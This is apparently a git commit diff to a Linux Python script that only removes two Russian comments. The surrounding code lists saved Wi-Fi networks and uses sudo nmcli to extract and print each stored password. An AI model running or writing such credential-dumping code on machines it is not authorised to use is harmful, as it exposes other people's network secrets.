19f24bc2843d1b474b45557a236d2e271ce9bde4
rubxcv <154752736+rubxcv@users.noreply.github.com>
2023-12-30 19:18:43 +0400

    Update wpm_linux.py

--- wpm_linux.py
+++ wpm_linux.py
@@ -10,13 +10,10 @@ username = sys.argv[1]
 password = sys.argv[2]
 
 try:
-    # Получаем список сохраненных Wi-Fi сетей
     saved_networks = subprocess.check_output(["nmcli", "-t", "-f", "name", "connection", "show"]).decode('utf-8').strip().split('\n')
 
     for network_name in saved_networks:
         print(f"Working on network: {network_name}")
-
-        # Пример получения пароля (нужны права root и соответствующая настройка nmcli)
         try:
             wifi_password = subprocess.check_output(["sudo", "nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", network_name]).decode('utf-8').strip()
             print(f"Password for {network_name}: {wifi_password}")
